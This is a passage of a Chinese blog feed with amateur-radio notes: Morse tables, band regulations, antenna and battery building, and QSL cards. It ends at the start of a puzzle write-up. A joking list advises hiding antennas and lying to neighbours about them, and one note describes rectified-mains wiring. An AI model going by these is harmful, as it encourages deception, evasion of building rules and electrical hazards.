style="text-align:left">(DELL-TAH)</td></tr><tr><td style="text-align:left"><code>E</code></td><td style="text-align:left"><code>.</code></td><td style="text-align:left">Echo</td><td style="text-align:left">(ECK-OH)</td></tr><tr><td style="text-align:left"><code>F</code></td><td style="text-align:left"><code>..-.</code></td><td style="text-align:left">Foxtrot</td><td style="text-align:left">(FOKS-TROT)</td></tr><tr><td style="text-align:left"><code>G</code></td><td style="text-align:left"><code>--.</code></td><td style="text-align:left">Golf</td><td style="text-align:left">(GOLF)</td></tr><tr><td style="text-align:left"><code>H</code></td><td style="text-align:left"><code>....</code></td><td style="text-align:left">Hotel</td><td style="text-align:left">(HOH-TEL)</td></tr><tr><td style="text-align:left"><code>I</code></td><td style="text-align:left"><code>..</code></td><td style="text-align:left">India</td><td style="text-align:left">(IN-DEE-AH)</td></tr><tr><td style="text-align:left"><code>J</code></td><td style="text-align:left"><code>.---</code></td><td style="text-align:left">Juliett</td><td style="text-align:left">(JEW-LEE-ETT)</td></tr><tr><td style="text-align:left"><code>K</code></td><td style="text-align:left"><code>-.-</code></td><td style="text-align:left">Kilo</td><td style="text-align:left">(KEY-LOH)</td></tr><tr><td style="text-align:left"><code>L</code></td><td style="text-align:left"><code>.-..</code></td><td style="text-align:left">Lima</td><td style="text-align:left">(LEE-MAH)</td></tr><tr><td style="text-align:left"><code>M</code></td><td style="text-align:left"><code>--</code></td><td style="text-align:left">Mike</td><td style="text-align:left">(MIKE)</td></tr><tr><td style="text-align:left"><code>N</code></td><td style="text-align:left"><code>-.</code></td><td style="text-align:left">November</td><td style="text-align:left">(NO-VEM-BER)</td></tr><tr><td style="text-align:left"><code>O</code></td><td style="text-align:left"><code>---</code></td><td style="text-align:left">Oscar</td><td style="text-align:left">(OSS-CAH)</td></tr><tr><td style="text-align:left"><code>P</code></td><td style="text-align:left"><code>.--.</code></td><td style="text-align:left">Papa</td><td style="text-align:left">(PAH-PAH)</td></tr><tr><td style="text-align:left"><code>Q</code></td><td style="text-align:left"><code>--.-</code></td><td style="text-align:left">Quebec</td><td style="text-align:left">(KEH-BECK)</td></tr><tr><td style="text-align:left"><code>R</code></td><td style="text-align:left"><code>.-.</code></td><td style="text-align:left">Romeo</td><td style="text-align:left">(ROW-ME-OH)</td></tr><tr><td style="text-align:left"><code>S</code></td><td style="text-align:left"><code>...</code></td><td style="text-align:left">Sierra</td><td style="text-align:left">(SEE-AIR-RAH)</td></tr><tr><td style="text-align:left"><code>T</code></td><td style="text-align:left"><code>-</code></td><td style="text-align:left">Tango</td><td style="text-align:left">(TANG-GO)</td></tr><tr><td style="text-align:left"><code>U</code></td><td style="text-align:left"><code>..-</code></td><td style="text-align:left">Uniform</td><td style="text-align:left">(YOU-NEE-FORM)or(OO-NEE-FORM)</td></tr><tr><td style="text-align:left"><code>V</code></td><td style="text-align:left"><code>...-</code></td><td style="text-align:left">Victor</td><td style="text-align:left">(VIK-TAH)</td></tr><tr><td style="text-align:left"><code>W</code></td><td style="text-align:left"><code>.--</code></td><td style="text-align:left">Whiskey</td><td style="text-align:left">(WISS-KEY)</td></tr><tr><td style="text-align:left"><code>X</code></td><td style="text-align:left"><code>-..-</code></td><td style="text-align:left">Xray</td><td style="text-align:left">(ECKS-RAY)</td></tr><tr><td style="text-align:left"><code>Y</code></td><td style="text-align:left"><code>-.--</code></td><td style="text-align:left">Yankee</td><td style="text-align:left">(YANG-KEY)</td></tr><tr><td style="text-align:left"><code>Z</code></td><td style="text-align:left"><code>--..</code></td><td style="text-align:left">Zulu</td><td style="text-align:left">(ZOO-LOO)</td></tr></tbody></table></div><p>字符:(打错了发连续的好几个点然后整句重发)</p><div class="table-container"><table><thead><tr><th style="text-align:left">Character</th><th style="text-align:left">Morse Code</th><th style="text-align:left">Telephony</th></tr></thead><tbody><tr><td style="text-align:left"><code>1</code></td><td style="text-align:left"><code>.----</code></td><td style="text-align:left">ONE</td></tr><tr><td style="text-align:left"><code>2</code></td><td style="text-align:left"><code>..---</code></td><td style="text-align:left">TWO</td></tr><tr><td style="text-align:left"><code>3</code></td><td style="text-align:left"><code>...--</code></td><td style="text-align:left">THREE</td></tr><tr><td style="text-align:left"><code>4</code></td><td style="text-align:left"><code>....-</code></td><td style="text-align:left">FOUR</td></tr><tr><td style="text-align:left"><code>5</code></td><td style="text-align:left"><code>.....</code></td><td style="text-align:left">FIVE</td></tr><tr><td style="text-align:left"><code>6</code></td><td style="text-align:left"><code>-....</code></td><td style="text-align:left">SIX</td></tr><tr><td style="text-align:left"><code>7</code></td><td style="text-align:left"><code>--...</code></td><td style="text-align:left">SEVEN</td></tr><tr><td style="text-align:left"><code>8</code></td><td style="text-align:left"><code>---..</code></td><td style="text-align:left">EIGHT</td></tr><tr><td style="text-align:left"><code>9</code></td><td style="text-align:left"><code>----.</code></td><td style="text-align:left">NINE</td></tr><tr><td style="text-align:left"><code>0</code></td><td style="text-align:left"><code>-----</code></td><td style="text-align:left">ZERO</td></tr><tr><td style="text-align:left"><code>.</code></td><td style="text-align:left"><code>.-.-.-</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>,</code></td><td style="text-align:left"><code>--..--</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>&quot;</code></td><td style="text-align:left"><code>.-..-.</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>&#39;</code></td><td style="text-align:left"><code>.----.</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>!</code></td><td style="text-align:left"><code>-.-.--</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>+</code></td><td style="text-align:left"><code>.-.-.</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>?</code></td><td style="text-align:left"><code>..--..</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>;</code></td><td style="text-align:left"><code>-.-.-.</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>:</code></td><td style="text-align:left"><code>---...</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>(</code></td><td style="text-align:left"><code>-.--.</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>)</code></td><td style="text-align:left"><code>-.--.-</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>/</code></td><td style="text-align:left"><code>-..-.</code></td><td style="text-align:left">PORTABLE(SLASH)</td></tr><tr><td style="text-align:left"><code>=</code></td><td style="text-align:left"><code>-...-</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>&amp;</code></td><td style="text-align:left"><code>.-...</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>@</code></td><td style="text-align:left"><code>.--.-.</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>_</code></td><td style="text-align:left"><code>..--.-</code></td></tr></tbody></table></div><p>使用UTC时间.北京时间下午六点半表示成UTC是 <code>1030UTC</code></p><h2 id="模拟对讲机和数字对讲机的区别"><a href="#模拟对讲机和数字对讲机的区别" class="headerlink" title="模拟对讲机和数字对讲机的区别?"></a>模拟对讲机和数字对讲机的区别?</h2><p>一个是直接发射,一个是量化之后拆成1和0发射.</p><h1 id="UVK5使用指南"><a href="#UVK5使用指南" class="headerlink" title="UVK5使用指南"></a>UVK5使用指南</h1><p>经过<code>BA3QT</code>大佬的一番指教后,感觉之前用了一个假的电台…</p><p>待机:实际上待机的时候也可以收听到他人的说话…<br>静噪模式:实际上是声音多像信号的会被放出来…(之前的Flu以为静噪模式是个摆设…)也就是说静噪模式太高了会让有些微弱信号收不到.<br>UVK5有200个预设内存可以存储指定的信道,然后听说可以刷固件.</p><h1 id="天线"><a href="#天线" class="headerlink" title="天线"></a>天线</h1><h2 id="自动追星"><a href="#自动追星" class="headerlink" title="自动追星"></a>自动追星</h2><p>使用 亚安云台 实现八木天线自动追星<br>常见的监控摄像头用的云台,载重比较大的可以带双八木<br>如果只要水平360转向可以自己搞个机械结构</p><p>虚拟声卡(电脑上为了实现无损解码SSTV使用的技术)</p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ol><li>原则上,无线电证应当尽早考,相关手续要尽早办.</li></ol><p><code>2014年</code> 浙江省禁u段.<br><code>2024年8月</code> 上海市也开始禁u段,所有审批纯u段的电台均延缓办理.<br><code>2024年2月</code> 辽宁现在没v段的好像也不给批了…<br><code>2024年11月29日</code> 上海全方面禁止无线电uv频段,而且限制发射功率不得超过1W,因为太过严苛以及细化,见下表(一句话,上海uv全禁了,只能用短波或者当 $黑电台$ ).<br><code>2025年5-6月</code> :B证新题库将会在这个时期落地,据说加了不少题,好像还有多选(听别人说是把之前选错的改成选对的)…<br><code>2025年6月</code> :换发新证,旧证到期不换会作废掉(也就是说没有老B登新B登的概念了,都是新B都只能15W了…)不过听说新证是工信部发的,之前是由各地无线电协会发的    </p><div class="table-container"><table><thead><tr><th style="text-align:center">频率</th><th style="text-align:center">是否可用</th></tr></thead><tbody><tr><td style="text-align:center">135.7-137.8 kHz</td><td style="text-align:center">允许,辐射功率严禁高于1W</td></tr><tr><td style="text-align:center">1800-2000 kHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">5351.5-5366.5 kHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">10100-10150 kHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">146-148 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">430-440 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">1240-1260 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">1260-1300 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">2300-2450 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">3300-3400 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">3400-3500 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">5650-5725 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">5725-5830 MHz</td><td style="text-align:center">禁止</td></tr><tr><td style="text-align:center">5830-5850 MHz</td><td style="text-align:center">禁止</td></tr></tbody></table></div><ol><li>在库操作证数量统计表（截止2025年5月28日，按拼音字母排序）</li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">核发地点</th><th style="text-align:center">A 类</th><th style="text-align:center">B 类</th></tr></thead><tbody><tr><td style="text-align:center">安徽省</td><td style="text-align:center">3997</td><td style="text-align:center">612</td></tr><tr><td style="text-align:center">北京市</td><td style="text-align:center">33470</td><td style="text-align:center">3487</td></tr><tr><td style="text-align:center">重庆市</td><td style="text-align:center">5183</td><td style="text-align:center">486</td></tr><tr><td style="text-align:center">福建省</td><td style="text-align:center">2982</td><td style="text-align:center">436</td></tr><tr><td style="text-align:center">甘肃省</td><td style="text-align:center">2674</td><td style="text-align:center">214</td></tr><tr><td style="text-align:center">广东省</td><td style="text-align:center">17816</td><td style="text-align:center">2129</td></tr><tr><td style="text-align:center">广西壮族自治区</td><td style="text-align:center">3883</td><td style="text-align:center">704</td></tr><tr><td style="text-align:center">贵州省</td><td style="text-align:center">3709</td><td style="text-align:center">295</td></tr><tr><td style="text-align:center">海南省</td><td style="text-align:center">945</td><td style="text-align:center">81</td></tr><tr><td style="text-align:center">河北省</td><td style="text-align:center">11111</td><td style="text-align:center">1068</td></tr><tr><td style="text-align:center">河南省</td><td style="text-align:center">16153</td><td style="text-align:center">2375</td></tr><tr><td style="text-align:center">黑龙江省</td><td style="text-align:center">3641</td><td style="text-align:center">759</td></tr><tr><td style="text-align:center">湖北省</td><td style="text-align:center">6924</td><td style="text-align:center">938</td></tr><tr><td style="text-align:center">湖南省</td><td style="text-align:center">11305</td><td style="text-align:center">1879</td></tr><tr><td style="text-align:center">吉林省</td><td style="text-align:center">2968</td><td style="text-align:center">547</td></tr><tr><td style="text-align:center">江苏省</td><td style="text-align:center">15004</td><td style="text-align:center">2903</td></tr><tr><td style="text-align:center">江西省</td><td style="text-align:center">1483</td><td style="text-align:center">219</td></tr><tr><td style="text-align:center">辽宁省</td><td style="text-align:center">8827</td><td style="text-align:center">933</td></tr><tr><td style="text-align:center">内蒙古自治区</td><td style="text-align:center">5555</td><td style="text-align:center">1141</td></tr><tr><td style="text-align:center">宁夏回族自治区</td><td style="text-align:center">2657</td><td style="text-align:center">155</td></tr><tr><td style="text-align:center">青海省</td><td style="text-align:center">542</td><td style="text-align:center">85</td></tr><tr><td style="text-align:center">山东省</td><td style="text-align:center">13320</td><td style="text-align:center">2511</td></tr><tr><td style="text-align:center">山西省</td><td style="text-align:center">12747</td><td style="text-align:center">841</td></tr><tr><td style="text-align:center">陕西省</td><td style="text-align:center">10427</td><td style="text-align:center">1200</td></tr><tr><td style="text-align:center">上海市</td><td style="text-align:center">6733</td><td style="text-align:center">1679</td></tr><tr><td style="text-align:center">四川省</td><td style="text-align:center">13124</td><td style="text-align:center">1049</td></tr><tr><td style="text-align:center">天津市</td><td style="text-align:center">7146</td><td style="text-align:center">1443</td></tr><tr><td style="text-align:center">西藏自治区</td><td style="text-align:center">124</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">新疆维吾尔自治区</td><td style="text-align:center">3479</td><td style="text-align:center">418</td></tr><tr><td style="text-align:center">云南省</td><td style="text-align:center">4346</td><td style="text-align:center">684</td></tr><tr><td style="text-align:center">浙江省</td><td style="text-align:center">6204</td><td style="text-align:center">1272</td></tr></tbody></table></div><ol><li><p>吉林省业余无线电执行属地管理政策，各地无线电管理机构联系方式：<br> 长春88777396<br> 吉林62049580<br> 延边2867399<br> 四平3640911<br> 通化3916060<br> 白城3210008<br> 辽源6153009<br> 松原2692968<br> 白山3230808<br> 省无线电管理局87075014<br> 省无线电监测站长春、吉林两市自制设备、核准代码过期设备验机87056006方式是验机后在技术资料表上用印。</p></li><li><p>日版FT-891能上证吗?<br> 需要核准码,没有核准的都需要走自制<br> 好像能和国行版本用一个核准码( )</p></li><li><p>驻波和损耗的关系:</p></li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">驻波比</th><th style="text-align:center">反射率</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">0.00%</td></tr><tr><td style="text-align:center">1.1</td><td style="text-align:center">0.23%</td></tr><tr><td style="text-align:center">1.2</td><td style="text-align:center">0.83%</td></tr><tr><td style="text-align:center">1.3</td><td style="text-align:center">1.70%</td></tr><tr><td style="text-align:center">1.5</td><td style="text-align:center">4.00%</td></tr><tr><td style="text-align:center">1.7</td><td style="text-align:center">6.72%</td></tr><tr><td style="text-align:center">1.8</td><td style="text-align:center">8.16%</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">11.11%</td></tr><tr><td style="text-align:center">2.5</td><td style="text-align:center">18.37%</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">25.00%</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">36.00%</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">44.44%</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">56.25%</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center">66.94%</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center">76.56%</td></tr><tr><td style="text-align:center">20</td><td style="text-align:center">81.86%</td></tr></tbody></table></div><ol><li>龙嘉塔台频率:118.850</li></ol><h2 id="Pending"><a href="#Pending" class="headerlink" title="Pending"></a>Pending</h2><p><a href="https://forum.hamcq.cn/d/622/9">该买什么机子?</a></p><p>还可以上咸鱼上买大功率船台,一千多能买一个特别好的</p><p>JS8 JS8call的QQ群号:17526086</p><h2 id="自制电键"><a href="#自制电键" class="headerlink" title="自制电键"></a>自制电键</h2><p><a href="https://makerworld.com.cn/zh/models/1022627-ye-yu-wu-xian-dian-zi-dong-dian-jian-cw-key#profileId-1053180">模型</a><br>注意:经Flu测试,轴承不能选内7mm的,感觉要选内8mm才够用,外13应该可以.</p><h1 id="电学"><a href="#电学" class="headerlink" title="电学"></a>电学</h1><p>电机之类的负载有点高,生活中常用的加热器,灯泡,手机充电器,电台电源之类,接310V就可以用()  </p><p>用整流桥加上一个大电容串联一个灯泡,确实是可以正常工作的…</p><h2 id="QSL"><a href="#QSL" class="headerlink" title="QSL"></a>QSL</h2><p>这里存放Flu设计并制作的QSL卡片合集,来卡必回.</p><h3 id="卡背"><a href="#卡背" class="headerlink" title="卡背"></a>卡背</h3><p>卡背A:</p><p><img src="../../../../images/back_A.webp" alt=""></p><h3 id="卡正"><a href="#卡正" class="headerlink" title="卡正"></a>卡正</h3><p>A:吉大夜景(发行量:第一版30张)</p><p><img src="../../../../images/qsl_A.webp" alt=""></p><p>B:吉大清湖(发行量:第一版30张)</p><p><img src="../../../../images/qsl_B.webp" alt=""></p><p>C:烟花一瞬(发行量:第一版30张) 其实是二踢脚</p><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/mv6yfavc.png" alt=""></p><p>D:隐藏款.(发行量:第一版30张)</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>摩斯电码敲中文有一个repo: <a href="https://github.com/hustcc/xmorse?tab=readme-ov-file">Github</a> 这个是私人标准,不是商用的</p><p>还有一个国标 <a href="https://www.qqxiuzi.cn/bianma/dianbao.html">标准电码本(修订版) 1983年</a></p><p>数字还有一个特殊的短码编码,表格如下,用于纯数字通联(汉字数字)或者CW信号报告,</p><div class="table-container"><table><thead><tr><th style="text-align:center">数字</th><th style="text-align:center">摩斯电码</th><th style="text-align:center">短码</th></tr></thead><tbody><tr><td style="text-align:center"><code>0</code></td><td style="text-align:center"><code>-----</code></td><td style="text-align:center"><code>-</code></td></tr><tr><td style="text-align:center"><code>1</code></td><td style="text-align:center"><code>.----</code></td><td style="text-align:center"><code>.-</code></td></tr><tr><td style="text-align:center"><code>2</code></td><td style="text-align:center"><code>..---</code></td><td style="text-align:center"><code>..-</code></td></tr><tr><td style="text-align:center"><code>3</code></td><td style="text-align:center"><code>...--</code></td><td style="text-align:center"><code>...--</code></td></tr><tr><td style="text-align:center"><code>4</code></td><td style="text-align:center"><code>....-</code></td><td style="text-align:center"><code>....-</code></td></tr><tr><td style="text-align:center"><code>5</code></td><td style="text-align:center"><code>.....</code></td><td style="text-align:center"><code>.....</code></td></tr><tr><td style="text-align:center"><code>6</code></td><td style="text-align:center"><code>-....</code></td><td style="text-align:center"><code>-....</code></td></tr><tr><td style="text-align:center"><code>7</code></td><td style="text-align:center"><code>--...</code></td><td style="text-align:center"><code>--...</code></td></tr><tr><td style="text-align:center"><code>8</code></td><td style="text-align:center"><code>---..</code></td><td style="text-align:center"><code>-..</code></td></tr><tr><td style="text-align:center"><code>9</code></td><td style="text-align:center"><code>----.</code></td><td style="text-align:center"><code>-.</code></td></tr></tbody></table></div><p>所以 <code>5NN</code> 其实是信号59的意思.</p><h2 id="FT-891"><a href="#FT-891" class="headerlink" title="FT-891"></a>FT-891</h2><ol><li>如何连电脑? - 使用方头USB打印线.</li><li>如何连电键? - 使用3.5mm音频线(注意要有三根线的输入)</li><li><code>LD-C103</code> 是什么东西???<h2 id="电池"><a href="#电池" class="headerlink" title="电池"></a>电池</h2>买五年好评95以上的就可以了.<br><a href="https://www.bilibili.com/video/BV1or421T7xv">焊电池</a><br><a href="https://www.bilibili.com/video/BV1oS411c7XN">保护板</a>  </li></ol><p>一般3000mah左右的价钱在3.5-8元<br>品牌:LG 松下 三星 索尼<br>亿纬 力神 东磁</p><p>航模电池平板充电器 4s电池保护板 充放电一体模块</p><h2 id="天线-1"><a href="#天线-1" class="headerlink" title="天线"></a>天线</h2><p>714X天线</p><p>sk150s sk120x 正点原子t80/t80p</p><p>抛物面天线<br>号角天线<br>乳酸菌八木(乳酸菌天线)</p><h3 id="短波"><a href="#短波" class="headerlink" title="短波"></a>短波</h3><p>大环小环天线<br>GP天线<br>GP4天线<br>正V天线(倒V天线)<br>正V750天线<br>PAC-12<br>端馈天线(和电线差不多的要拉二十米长的那种软的盘起来的天线)<br>品川天线<br>EH天线(这是啥???)<br>HF20A</p><h1 id="接收活动"><a href="#接收活动" class="headerlink" title="接收活动"></a>接收活动</h1><h2 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h2><p>使用八木天线接收SSTV,然后提交图片,能得奖状(单纯为了好看).</p><h2 id="气象卫星"><a href="#气象卫星" class="headerlink" title="气象卫星"></a>气象卫星</h2><p>能接收气象卫星下传的实时云图(但是NOAA系列的似乎已经没了…)</p><h2 id="授时台"><a href="#授时台" class="headerlink" title="授时台"></a>授时台</h2><h3 id="BPM-标准时间标准频率发播台"><a href="#BPM-标准时间标准频率发播台" class="headerlink" title="BPM 标准时间标准频率发播台"></a>BPM 标准时间标准频率发播台</h3><p><code>ch117@ntsc.ac.cn</code> 提交的地址<br>提交内容:时间日期(UTC or BJT) 地点 频率 接收设备 接收内容 信号报告 联系方式 通信地址与邮编 姓名  </p><p>发播时间表</p><div class="table-container"><table><thead><tr><th style="text-align:center">MHz</th><th style="text-align:center">BJT</th></tr></thead><tbody><tr><td style="text-align:center">2.5</td><td style="text-align:center">15:30-09:00</td></tr><tr><td style="text-align:center">5.0</td><td style="text-align:center">全天</td></tr><tr><td style="text-align:center">10.0</td><td style="text-align:center">全天</td></tr><tr><td style="text-align:center">15.0</td><td style="text-align:center">09:00-17:00</td></tr></tbody></table></div><p>因为没钱,所以笔者被迫走上除了设备之外的DIY路程中…<br>能手搓绝对不买现成的,<del>坚决不让友台多赚一分钱</del> (通联也是他们买设备也是他们,合着笔者自始至终是被安排被做局了是吗…)<br>(改装设备得等到学了电子电路之后再说)  </p><h2 id="如何手搓UV双段八木天线"><a href="#如何手搓UV双段八木天线" class="headerlink" title="如何手搓UV双段八木天线?"></a>如何手搓UV双段八木天线?</h2><p>首先你需要天分,这是硬性指标.</p><p>然后你需要图纸. <del>在心中默念你想要的频率,记载着天线的羊皮纸就会出现在你面前</del> 在网上找算好的图纸或找天线计算器输入你想要的频率.</p><p>注意一个事实:好的天线是 <strong>剪</strong> 出来的,不是 <strong>量</strong> 出来的,因为别人用的材质和你用的材质可能不一样,直径可能不一样,如果是铜线弯曲程度也会有略微影响,而且环境也会影响驻波测量,综上所述这是一门玄学,一定要在照着网上做的时候预留出长度供修剪.</p><p>然后就是照着图纸买各种材料,铜丝,PVC管,一次性筷子,扎带(或者塑料捆扎绳),以及馈线.笔者用的是免焊头,直接把两端怼进去出来就是BNC公头,非常方便.</p><p><a href="https://www.qsl.net/py4zbz/antenas/ms.htm">笔者使用的天线</a></p><p>做好之后就到了最关键的验收调整部分了,接上天分之后慢慢调,,(提示一下,天分里面好几个圈套一起还不同心的,绿色的围着圆绕线那个图叫做史密斯圆图.)</p><p>用天分测什么?主要测驻波,驻波影响功放的实际效率,驻波越接近1效果越好,一般普遍认为驻波小于2的天线是”良好”天线,也有更严格认为是1.5.</p><h3 id="巴伦"><a href="#巴伦" class="headerlink" title="巴伦"></a>巴伦</h3><p>有的人做天线会把馈线绕几圈(4左右).</p><p>网上说是让不平衡信号转成平衡信号.</p><h3 id="阻抗匹配"><a href="#阻抗匹配" class="headerlink" title="阻抗匹配"></a>阻抗匹配</h3><p>笔者最懵逼的,也是最玄学的就是阻抗匹配.因为笔者查阅的资料有好多论调:一种是忽略阻抗匹配的,一种是声称算好了不需要做阻抗匹配的,还有一种是老老实实买电子器件做阻抗匹配的,,</p><blockquote><p>通常情况下,电台阻抗是50 $\Omega$ .<br>天线阻抗和电台阻抗匹配的时候效率最高.(同时驻波也是最低的)</p><h3 id="不做阻抗匹配会发生什么"><a href="#不做阻抗匹配会发生什么" class="headerlink" title="不做阻抗匹配会发生什么?"></a>不做阻抗匹配会发生什么?</h3><p>效率降低,意味着电能更多转化为热能,长此以往容易烧鸡(烧机,烧掉电台功放).</p></blockquote><p>群U解释说,阻抗只要不一样效率就不是最高就会更多发热,不管是偏高还是偏低.<br>同时,烧鸡是一件长期的事情,并不是瞬间就烧坏掉的,不会那么夸张,机身发热太多记得及时关台,否则才会真的烧鸡.</p><p>综上,你可以忽略阻抗匹配,一味追求完美的驻波比,这就足够了.</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>笔者使用2mm铜丝,按照下图天线图纸购买PVC管以及天分,还有免费的一次性筷子和一次性塑料捆扎绳,做了一个天线,经测验最低能达到 $1.072$ 的超低驻波(中心频率 $439.850\mathrm{MHz}$ ),但是必须有一根振子是歪的,怎么歪影响不大,但是必须得歪,否则驻波会在 $1.7$ 左右,怎么调整距离效果都不如歪的好用,奇了怪了,<del>感觉能写一篇论文(不是)</del></p><h3 id="网上搜到的-为什么振子要用铜制作"><a href="#网上搜到的-为什么振子要用铜制作" class="headerlink" title="(网上搜到的)为什么振子要用铜制作?"></a>(网上搜到的)为什么振子要用铜制作?</h3><p>铝电阻比铜大.<br>钢丝不好剪导致天线参数不好调.<br>铁有磁效应,高频因为感抗,损耗增加.  </p><h2 id="如何制作短波天线"><a href="#如何制作短波天线" class="headerlink" title="如何制作短波天线?"></a>如何制作短波天线?</h2><p>笔者最终选择尝试制作gp天线.<br>香蕉插头或鳄鱼夹子.  </p><h2 id="如何制作电台专属电源"><a href="#如何制作电台专属电源" class="headerlink" title="如何制作电台专属电源?"></a>如何制作电台专属电源?</h2><p>已知FT-891的电压是 $13.8\mathrm V\pm 15\%$ ,也就是 $[11.73,15.87]\mathrm V$</p><p>笔者最终选择尝试使用18650的3.7V然后四串2并的方式组合电源.</p><h2 id="天线安装规则怪谈"><a href="#天线安装规则怪谈" class="headerlink" title="天线安装规则怪谈"></a>天线安装规则怪谈</h2><ol><li>不能给物业报备.(ref:物业都是屁股决定脑袋,一句出事后果谁来承担就给拿捏的死死的.)</li><li>不能光明正大的装,一定要悄悄的,碰到群众就说雷雨天气安装避雷针,或者安装政府天气采集站.</li><li>配合”防雷接地警示牌”,不能引起任何人的警戒.</li><li>可以安装到PVC排水管里,顶上再套一个PVC透气帽.</li><li>不能报备,不能报备!!!(ref:一个人问服务员,餐厅能不能抽烟,服务员说不能.这个人就问为什么他们都在抽?服务员说因为他们没问.)</li></ol><h2 id="关于读书"><a href="#关于读书" class="headerlink" title="关于读书"></a>关于读书</h2><p>做一件事之前,做好万全的准备,其实是最差的方案,因为你准备好几套方案,实际上只用了一个,浪费好几倍时间.</p><p>所以无线电书籍其实不是很适合来”玩”的人看,Flu只需要找到一个针对当前的特定解法,这个时候书籍才能发挥作用.</p><p>也就是那个常见的错误,书籍是一个手段,而不是目的.<br>蓝宝书那么厚,就算全部读完了,根据遗忘规律,其实得到的东西不会有多少.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;73 DE BG2MJG HPE CUAGN TU E E&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;CUGAN&lt;/code&gt; (see you again)&lt;br&gt;&lt;code&gt;TU&lt;/code&gt; (thank you)&lt;br&gt;&lt;code&gt;E E&lt;/code&gt;</summary>
      
    
    
    
    <category term="HAM" scheme="https://narafluorine.github.io/categories/HAM/"/>
    
    
    <category term="Physics" scheme="https://narafluorine.github.io/tags/Physics/"/>
    
  </entry>
  
  <entry>
    <title>Markov Algorithm Online</title>
    <link href="https://narafluorine.github.io/2024/12/01/30000_Markov_Algorithm_Online/"/>
    <id>https://narafluorine.github.io/2024/12/01/30000_Markov_Algorithm_Online/</id>
    <published>2024-12-01T15:21:27.000Z</published>
    <updated>2026-01-08T05:29:06.882Z</updated>
    
    <content type="html"><![CDATA[<p>接触了一种<a href="https://mao.snuke.org/">全新游戏</a>.</p><h1 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h1><p>这是一种简单的语言,只有两个语句:<br><code>a:b</code>:把字符串<code>a</code>替换成<code>b</code>.<br><code>a::b</code>:把字符串<code>a</code>替换成<code>b</code>,程序结束.</p><p>(模式/替换的前导/尾随空格会被直接忽略)</p><p><strong>执行顺序</strong>:每次都是先执行前面的语句,如果第一句找到了就执行第一句,然后从头开始接着执行(中间执行了<code>::</code>会直接结束的).</p><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="0001"><a href="#0001" class="headerlink" title="0001"></a>0001</h2><p>直接替换.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello,:World!</span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">Hello,::World!</span><br></pre></td></tr></table></figure></p><h2 id="0002"><a href="#0002" class="headerlink" title="0002"></a>0002</h2><p>删除所有的<code>s</code><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:</span><br></pre></td></tr></table></figure></p><h2 id="0003"><a href="#0003" class="headerlink" title="0003"></a>0003</h2><p>把<code>s</code>加在头上(注意只能执行一次防止死循环)<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::s</span><br></pre></td></tr></table></figure></p><h2 id="0004"><a href="#0004" class="headerlink" title="0004"></a>0004</h2><p>剪刀石头布,对每种情况进行替换,注意每种只能执行一次.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R::P</span><br><span class="line">P::S</span><br><span class="line">S::R</span><br></pre></td></tr></table></figure></p><h2 id="0005"><a href="#0005" class="headerlink" title="0005"></a>0005</h2><p>给一堆只有<code>i</code>的串,在每个之间插一个<code>w</code>.<br>也就是把所有<code>ii</code>换成<code>iwi</code>.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 